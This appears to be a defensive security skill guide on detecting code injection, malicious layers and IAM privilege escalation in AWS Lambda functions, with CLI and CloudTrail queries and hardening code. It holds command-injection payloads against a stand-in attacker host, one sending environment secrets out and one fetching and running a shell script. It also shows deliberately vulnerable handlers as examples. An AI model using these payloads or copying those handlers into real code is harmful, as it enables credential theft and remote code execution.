---
name: detecting-serverless-function-injection
description: 'Detects and prevents code injection attacks targeting serverless functions
  (AWS Lambda, Azure Functions, Google Cloud Functions) through event source poisoning,
  malicious layer injection, runtime command execution, and IAM privilege escalation
  via function modification. The analyst combines static analysis of function code,
  CloudTrail event correlation, runtime behavior monitoring, and IAM policy auditing
  to identify injection vectors across the expanded serverless attack surface including
  API Gateway, S3, SQS, DynamoDB Streams, and CloudWatch event triggers. Activates
  for requests involving Lambda security assessment, serverless injection detection,
  function event poisoning analysis, or serverless privilege escalation investigation.

  '
domain: cybersecurity
subdomain: cloud-security
tags:
- serverless-security
- Lambda-injection
- event-source-poisoning
- OWASP-serverless
- IAM-escalation
- CloudTrail
version: 1.0.0
author: mukul975
license: Apache-2.0
nist_csf:
- PR.IR-01
- ID.AM-08
- GV.SC-06
- DE.CM-01
mitre_attack:
- T1190
- T1059
- T1648
- T1078.004
- T1068
---
# Detecting Serverless Function Injection

## When to Use

- Auditing Lambda/Cloud Functions for code injection vulnerabilities where unsanitized event data flows into dangerous runtime functions (`eval`, `exec`, `child_process.exec`, `os.system`)
- Investigating incidents where an attacker modified function code or layers to establish persistence or exfiltrate data from the serverless environment
- Detecting privilege escalation paths where an adversary with `lambda:UpdateFunctionCode` and `iam:PassRole` can assume higher-privilege execution roles
- Analyzing event source poisoning attacks where malicious payloads are injected through S3 object uploads, SQS messages, DynamoDB stream records, or API Gateway requests that trigger function execution
- Building detection rules for SOC teams monitoring serverless workloads for unauthorized function modifications, layer additions, and suspicious invocation patterns

**Do not use** for load testing or denial-of-service simulation against serverless functions, for testing against production functions processing live customer data without explicit authorization, or for modifying IAM policies in shared accounts without change management approval.

## Prerequisites

- AWS account access with read permissions for Lambda, CloudTrail, IAM, CloudWatch Logs, and EventBridge
- AWS CLI v2 configured with appropriate credentials and region
- CloudTrail enabled with Data Events for Lambda (captures `Invoke` events) and Management Events (captures `UpdateFunctionCode`, `UpdateFunctionConfiguration`, `CreateFunction`)
- Python 3.9+ with `boto3`, `bandit` (Python SAST), and `semgrep` for static analysis
- Access to function source code or deployment packages for static analysis
- CloudWatch Logs Insights access for querying Lambda execution logs

## Workflow

### Step 1: Enumerate the Serverless Attack Surface

Map all Lambda functions and their event source triggers to understand injection entry points:

- **List all Lambda functions and their configurations**:
  ```bash
  aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role,Handler,Layers]' --output table
  ```
- **Map event source mappings**: Each event source mapping is a potential injection entry point where untrusted data enters the function:
  ```bash
  aws lambda list-event-source-mappings --output json | \
    jq '.EventSourceMappings[] | {Function: .FunctionArn, Source: .EventSourceArn, State: .State}'
  ```
- **Identify API Gateway triggers**: API Gateway routes pass HTTP request data (headers, query strings, body, path parameters) directly into the Lambda event object:
  ```bash
  aws apigateway get-rest-apis --query 'items[*].[id,name]' --output table
  ```
  For each API, enumerate resources and methods to identify which Lambda functions receive user-controlled HTTP input.
- **Identify S3 event triggers**: S3 bucket notifications can trigger Lambda with attacker-controlled object keys and metadata:
  ```bash
  aws s3api get-bucket-notification-configuration --bucket <bucket-name>
  ```
- **Catalog function environment variables**: Secrets in environment variables are exposed if an attacker achieves code execution inside the function:
  ```bash
  aws lambda get-function-configuration --function-name <name> \
    --query 'Environment.Variables' --output json
  ```
- **Identify overprivileged execution roles**: Functions with `*` resource permissions or administrative policies are high-value escalation targets:
  ```bash
  aws iam list-attached-role-policies --role-name <lambda-exec-role>
  aws iam list-role-policies --role-name <lambda-exec-role>
  ```

### Step 2: Static Analysis for Injection Sinks

Scan function code for dangerous patterns that allow injected event data to execute as code or commands:

- **Download function deployment packages**:
  ```bash
  aws lambda get-function --function-name <name> --query 'Code.Location' --output text | xargs curl -o function.zip
  unzip function.zip -d function_code/
  ```
- **Python injection sinks** (Lambda Python runtimes): Search for functions that execute strings as code:
  ```python
  # DANGEROUS: Direct eval/exec of event data
  eval(event['expression'])           # Code injection via eval
  exec(event['code'])                 # Arbitrary code execution
  os.system(event['command'])         # OS command injection
  subprocess.call(event['cmd'], shell=True)  # Shell injection
  os.popen(event['input'])            # Command injection
  pickle.loads(event['data'])         # Deserialization attack
  yaml.load(event['config'])          # YAML deserialization (unsafe loader)
  ```
- **Node.js injection sinks** (Lambda Node.js runtimes):
  ```javascript
  // DANGEROUS: Direct execution of event data
  eval(event.expression);                    // Code injection
  new Function(event.code)();               // Dynamic function creation
  child_process.exec(event.command);         // OS command injection
  child_process.execSync(event.cmd);         // Synchronous command injection
  vm.runInNewContext(event.script);          // Sandbox escape potential
  require('child_process').exec(event.input); // Import-and-execute pattern
  ```
- **Run Semgrep with serverless rules**: Use purpose-built rules that detect event data flowing into injection sinks:
  ```bash
  semgrep --config "p/owasp-top-ten" --config "p/command-injection" \
    --config "p/python-security" function_code/ --json --output semgrep_results.json
  ```
- **Run Bandit for Python functions**:
  ```bash
  bandit -r function_code/ -f json -o bandit_results.json \
    -t B102,B301,B307,B602,B603,B604,B605,B606,B607
  ```
  These test IDs specifically target `exec`, `pickle`, `eval`, `subprocess` with `shell=True`, and other injection-relevant patterns.

- **Custom pattern detection**: Search for indirect injection patterns where event data is concatenated into strings that are later executed:
  ```python
  # Indirect injection: event data flows into SQL query string
  query = f"SELECT * FROM users WHERE id = '{event['userId']}'"
  cursor.execute(query)  # SQL injection

  # Indirect injection: event data flows into template rendering
  template = event['template']
  rendered = jinja2.Template(template).render()  # SSTI
  ```

### Step 3: Detect Event Source Poisoning

Analyze event sources for injection payloads that exploit how Lambda processes triggers:

- **S3 event key injection**: When a Lambda function processes S3 events, the object key from the event record can contain injection payloads. An attacker uploads an object with a malicious key name:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      bucket = event['Records'][0]['s3']['bucket']['name']
      key = event['Records'][0]['s3']['object']['key']
      # VULNERABLE: key is attacker-controlled
      os.system(f"aws s3 cp s3://{bucket}/{key} /tmp/file")
  ```
  Attack: Upload an object with key `; curl http://attacker.com/exfil?data=$(env)` to inject a command through the S3 event.

- **SQS message body injection**: Lambda processes SQS messages where the body contains attacker-controlled data:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      for record in event['Records']:
          message = json.loads(record['body'])
          # VULNERABLE: message content used in eval
          result = eval(message['formula'])
  ```

- **API Gateway header/parameter injection**: HTTP request data passes through API Gateway into the Lambda event:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      user_agent = event['headers']['User-Agent']
      # VULNERABLE: header value used in shell command
      subprocess.run(f"echo {user_agent} >> /tmp/access.log", shell=True)
  ```

- **DynamoDB Stream record injection**: Modified DynamoDB items trigger Lambda with the new record values. If an attacker can write to the table, they control the event data:
  ```python
  # Vulnerable Lambda handler
  def handler(event, context):
      for record in event['Records']:
          new_image = record['dynamodb']['NewImage']
          config = new_image['config']['S']
          # VULNERABLE: DynamoDB record value used in exec
          exec(config)
  ```

- **Detection via CloudWatch Logs Insights**: Query for evidence of injection attempts in function execution logs:
  ```
  fields @timestamp, @message
  | filter @message like /(?i)(eval|exec|os\.system|child_process|subprocess|import os)/
  | filter @message like /(?i)(error|exception|traceback|syntax)/
  | sort @timestamp desc
  | limit 100
  ```

### Step 4: Detect Malicious Lambda Layer Injection

Identify unauthorized Lambda layers that intercept function execution or exfiltrate data:

- **Audit current layer attachments**: List all functions and their layer versions to identify unexpected additions:
  ```bash
  aws lambda list-functions --query 'Functions[*].[FunctionName,Layers[*].Arn]' --output json
  ```
- **Detect layer modification events in CloudTrail**: Query for `UpdateFunctionConfiguration` events that add or change layers:
  ```bash
  aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionConfiguration \
    --start-time "2026-03-12T00:00:00Z" \
    --end-time "2026-03-19T23:59:59Z" \
    --query 'Events[*].[EventTime,Username,CloudTrailEvent]'
  ```
  Parse the `CloudTrailEvent` JSON to check if `Layers` was modified in the request parameters.

- **Analyze layer contents**: Download and inspect layer packages for malicious code:
  ```bash
  aws lambda get-layer-version --layer-name <layer-name> --version-number <version> \
    --query 'Content.Location' --output text | xargs curl -o layer.zip
  unzip layer.zip -d layer_contents/
  # Search for suspicious patterns
  grep -rn "urllib\|requests\|http\|socket\|exfil\|base64\|subprocess" layer_contents/
  ```

- **Layer hijacking indicators**: A malicious layer can override the function's runtime behavior by placing files in the runtime's search path:
  - Python: Layer code in `/opt/python/` is imported before the function's own modules
  - Node.js: Layer code in `/opt/nodejs/node_modules/` overrides function dependencies
  - A layer providing a modified `boto3` package can intercept all AWS API calls, log credentials, and forward requests to an attacker-controlled endpoint

- **CloudTrail detection query for layer changes**:
  ```json
  {
    "source": ["aws.lambda"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["UpdateFunctionConfiguration20150331v2", "PublishLayerVersion20181031"],
      "errorCode": [{"exists": false}]
    }
  }
  ```

### Step 5: Detect IAM Privilege Escalation via Lambda

Identify escalation paths where attackers modify functions to assume higher-privilege roles:

- **The Lambda privilege escalation pattern**: An attacker with `lambda:UpdateFunctionCode` and `iam:PassRole` permissions can:
  1. Identify a Lambda function with a high-privilege execution role (e.g., AdministratorAccess)
  2. Modify the function's code to call `sts:GetCallerIdentity` or perform privileged actions
  3. Invoke the function, which executes with the high-privilege role
  4. Exfiltrate the role's temporary credentials from the function's environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`)

- **Detect UpdateFunctionCode events**: Monitor CloudTrail for function code modifications:
  ```bash
  aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=UpdateFunctionCode20150331v2 \
    --start-time "2026-03-12T00:00:00Z" \
    --query 'Events[*].[EventTime,Username,Resources[0].ResourceName]' --output table
  ```

- **Detect PassRole to Lambda**: `iam:PassRole` is required to attach a different execution role to a function. Monitor for this:
  ```
  # CloudWatch Logs Insights on CloudTrail logs
  fields eventTime, userIdentity.arn, requestParameters.functionName, requestParameters.role
  | filter eventName = "UpdateFunctionConfiguration20150331v2"
  | filter ispresent(requestParameters.role)
  | sort eventTime desc
  ```

- **Detect credential exfiltration from Lambda**: A compromised function may call STS or create new IAM entities:
  ```
  fields eventTime, userIdentity.arn, eventName, sourceIPAddress
  | filter userIdentity.arn like /.*:assumed-role\/.*lambda.*/
  | filter eventName in ["GetCallerIdentity", "CreateUser", "AttachUserPolicy",
      "CreateAccessKey", "AssumeRole", "PutUserPolicy"]
  | sort eventTime desc
  ```

- **EventBridge rule for real-time alerting**: Create an EventBridge rule to trigger an SNS alert whenever function code is modified:
  ```json
  {
    "source": ["aws.lambda"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": [
        "UpdateFunctionCode20150331v2",
        "UpdateFunctionConfiguration20150331v2",
        "CreateFunction20150331"
      ],
      "errorCode": [{"exists": false}]
    }
  }
  ```

### Step 6: Implement Runtime Injection Prevention

Deploy runtime protection controls to prevent injection at execution time:

- **Input validation at handler entry**: Validate and sanitize all event data before processing:
  ```python
  import re
  import json
  from functools import wraps

  SAFE_PATTERNS = {
      'userId': re.compile(r'^[a-zA-Z0-9\-]{1,64}$'),
      'email': re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'),
      'action': re.compile(r'^(get|list|create|update|delete)$'),
  }

  def validate_event(schema):
      """Decorator that validates Lambda event against a whitelist schema."""
      def decorator(func):
          @wraps(func)
          def wrapper(event, context):
              for field, pattern in schema.items():
                  value = event.get(field, '')
                  if isinstance(value, str) and not pattern.match(value):
                      return {
                          'statusCode': 400,
                          'body': json.dumps({'error': f'Invalid {field}'})
                      }
              return func(event, context)
          return wrapper
      return decorator

  @validate_event(SAFE_PATTERNS)
  def handler(event, context):
      # Event data is validated before reaching this point
      user_id = event['userId']
      # Safe to use in queries with parameterized statements
      return {'statusCode': 200, 'body': json.dumps({'user': user_id})}
  ```

- **Lambda function URL authorization**: Ensure functions exposed via URLs require IAM auth:
  ```bash
  aws lambda get-function-url-config --function-name <name> \
    --query 'AuthType' --output text
  # Must return "AWS_IAM", not "NONE"
  ```

- **Least privilege execution roles**: Restrict the function's IAM role to the minimum required permissions:
  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": [
          "dynamodb:GetItem",
          "dynamodb:PutItem"
        ],
        "Resource": "arn:aws:dynamodb:us-east-1:111122223333:table/UserTable"
      },
      {
        "Effect": "Allow",
        "Action": "logs:*",
        "Resource": "arn:aws:logs:us-east-1:111122223333:log-group:/aws/lambda/my-function:*"
      }
    ]
  }
  ```

- **SCP to prevent dangerous Lambda modifications**: Apply a Service Control Policy at the organization level to restrict who can modify Lambda functions and pass roles:
  ```json
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "DenyLambdaCodeUpdateExceptCICD",
        "Effect": "Deny",
        "Action": [
          "lambda:UpdateFunctionCode",
          "lambda:UpdateFunctionConfiguration"
        ],
        "Resource": "*",
        "Condition": {
          "StringNotLike": {
            "aws:PrincipalArn": "arn:aws:iam::*:role/CICD-DeploymentRole"
          }
        }
      }
    ]
  }
  ```

- **AWS Lambda Powertools for structured logging**: Emit structured security events that can be ingested by SIEM:
  ```python
  from aws_lambda_powertools import Logger, Tracer
  from aws_lambda_powertools.utilities.validation import validate

  logger = Logger(service="payment-processor")
  tracer = Tracer()

  @logger.inject_lambda_context
  @tracer.capture_lambda_handler
  def handler(event, context):
      logger.info("Processing event", extra={
          "source_ip": event.get('requestContext', {}).get('identity', {}).get('sourceIp'),
          "user_agent": event.get('headers', {}).get('User-Agent'),
          "http_method": event.get('httpMethod'),
      })
  ```

## Key Concepts

| Term | Definition |
|------|------------|
| **Event Source Poisoning** | An attack where malicious data is injected into a serverless event source (S3, SQS, DynamoDB Stream, API Gateway) to trigger code execution or injection when the function processes the event |
| **Function Injection** | Exploitation of unsanitized event data that flows into dangerous runtime functions (eval, exec, os.system, child_process.exec) within a serverless function handler |
| **Lambda Layer Hijacking** | An attack where a malicious Lambda layer is attached to a function to intercept execution, override dependencies, or exfiltrate data by placing code in the runtime's module search path |
| **IAM Privilege Escalation via Lambda** | A technique where an attacker with UpdateFunctionCode and PassRole permissions modifies a function to execute with a higher-privilege IAM role, extracting temporary credentials |
| **OWASP Serverless Top 10** | A security framework identifying the ten most critical risks in serverless architectures, including injection (SAS-1), broken authentication (SAS-2), and over-privileged functions (SAS-6) |
| **Cold Start Injection** | An attack that targets the function initialization phase where environment variables, layer code, and extensions execute before the handler, potentially in an unmonitored context |
| **Execution Role** | The IAM role assumed by a Lambda function during execution, providing temporary credentials that define the function's AWS API access permissions |

## Tools & Systems

- **Semgrep**: Static analysis tool with serverless-specific rule packs that detect event data flowing into injection sinks across Python, Node.js, Java, and Go Lambda runtimes
- **Bandit**: Python-specific SAST tool that identifies security issues including use of eval, exec, subprocess with shell=True, and pickle deserialization
- **AWS CloudTrail**: Logs Lambda management events (UpdateFunctionCode, CreateFunction) and data events (Invoke) for detecting unauthorized modifications and anomalous invocation patterns
- **CloudWatch Logs Insights**: Query engine for searching Lambda execution logs for injection attempt indicators, runtime errors, and suspicious command patterns
- **AWS Config**: Evaluates Lambda function configurations against compliance rules including layer inventory, execution role permissions, and function URL authorization types
- **Prowler**: Open-source AWS security assessment tool with Lambda-specific checks for public access, overprivileged roles, and missing encryption

## Common Scenarios

### Scenario: Detecting and Responding to a Lambda-Based Privilege Escalation Attack

**Context**: A SOC analyst receives a GuardDuty alert for `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS` on an IAM role used by multiple Lambda functions. Investigation reveals that an attacker compromised a developer's AWS credentials with `lambda:UpdateFunctionCode` permissions and modified a payment processing function to exfiltrate the execution role's temporary credentials.

**Approach**:
1. Query CloudTrail for `UpdateFunctionCode` events in the past 7 days to identify when the function was modified and by which principal:
   ```
   fields eventTime, userIdentity.arn, requestParameters.functionName, sourceIPAddress
   | filter eventName = "UpdateFunctionCode20150331v2"
   | filter requestParameters.functionName = "payment-processor"
   | sort eventTime desc
   ```
2. Discover that the function was modified from an IP address in an unexpected geographic location at 02:47 UTC, outside of normal deployment windows
3. Download the modified function code and find an injected snippet that POSTs `os.environ['AWS_ACCESS_KEY_ID']`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` to an external endpoint on each invocation
4. Check if the attacker also added a malicious layer by querying for `UpdateFunctionConfiguration` events with layer changes
5. Verify the function's execution role permissions: the payment-processor role has `dynamodb:*`, `s3:GetObject`, `s3:PutObject`, and `sqs:SendMessage` across all resources, exceeding least privilege
6. Search CloudTrail for API calls made by the exfiltrated credentials from outside AWS, finding `sts:GetCallerIdentity`, `s3:ListBuckets`, `dynamodb:Scan` on the customer table, and `iam:CreateUser` attempts
7. Respond by reverting the function code from the last known-good deployment package in the CI/CD artifact store, rotating the execution role's session tokens, and adding an SCP that restricts `lambda:UpdateFunctionCode` to the CI/CD role only

**Pitfalls**:
- Only checking the function code and missing malicious layers that persist even after the function code is reverted
- Not searching for lateral movement from the exfiltrated credentials to other AWS services, missing data exfiltration from DynamoDB or S3
- Failing to check if the attacker created new IAM users, access keys, or roles during the window the credentials were valid
- Restoring the function without first preserving the malicious code as forensic evidence
- Not implementing preventive controls (SCP, EventBridge alerting) after remediation, leaving the same attack path open

## Output Format

```
## Serverless Function Injection Assessment

**Account**: 111122223333
**Region**: us-east-1
**Functions Analyzed**: 47
**Event Source Mappings**: 23
**Assessment Date**: 2026-03-19

### Critical Findings

#### FINDING-001: OS Command Injection in S3 Event Handler
**Function**: image-resize-processor
**Runtime**: python3.12
**Severity**: Critical (CVSS 9.8)
**Sink**: os.system() at handler.py:34
**Source**: event['Records'][0]['s3']['object']['key']
**Attack Vector**: Upload S3 object with key containing shell metacharacters
**Proof of Concept**:
  Object key: `; curl http://attacker.com/shell.sh | bash`
  Results in: os.system("convert /tmp/; curl http://attacker.com/shell.sh | bash")
**Remediation**: Replace os.system() with subprocess.run() with shell=False
  and validate the S3 key against an allowlist pattern.

#### FINDING-002: IAM Privilege Escalation Path
**Function**: data-export-worker
**Execution Role**: arn:aws:iam::111122223333:role/DataExportRole
**Role Permissions**: s3:*, dynamodb:*, iam:PassRole, lambda:*
**Risk**: Any user with lambda:UpdateFunctionCode can modify this function
  to execute arbitrary AWS API calls with AdministratorAccess-equivalent permissions.
**Remediation**: Apply least privilege to the execution role, restrict
  lambda:UpdateFunctionCode via SCP to CI/CD pipeline role only.

#### FINDING-003: Unauthorized Layer Attached
**Function**: auth-token-validator
**Layer**: arn:aws:lambda:us-east-1:999888777666:layer:utility-lib:3
**Layer Account**: External account (999888777666)
**Risk**: Layer from untrusted external account can intercept all function
  invocations, modify responses, or exfiltrate environment variables.
**Remediation**: Remove the external layer, vendor the dependency into the
  function's deployment package, add AWS Config rule to block external layers.

### Detection Rules Deployed
- EventBridge rule: Alert on UpdateFunctionCode from non-CI/CD principals
- CloudWatch alarm: Function error rate spike > 3x baseline in 5 minutes
- Config rule: Lambda functions must not have layers from external accounts
- Config rule: Lambda execution roles must not have wildcard resource permissions
```
